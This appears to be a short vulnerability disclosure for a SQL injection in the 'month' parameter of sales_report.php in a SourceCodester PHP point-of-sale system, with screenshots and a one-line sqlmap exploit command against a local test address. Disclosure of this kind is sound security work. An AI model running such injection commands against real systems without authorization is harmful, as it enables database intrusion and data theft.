vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/16127/best-pos-management-system-php.html

Vulnerability trigger parameter: $month

The process of vulnerability discovery is as follows：

![image](https://user-images.githubusercontent.com/30823782/220944878-8448837c-1455-4c6d-b78f-ee43b113f0ba.png)


exp

```
sqlmap.py -u "http://192.168.31.50/kruxton/sales_report.php?month=1"
```
![image](https://user-images.githubusercontent.com/30823782/220944926-9add862a-c744-4940-a0dd-67b9d36eae2c.png)

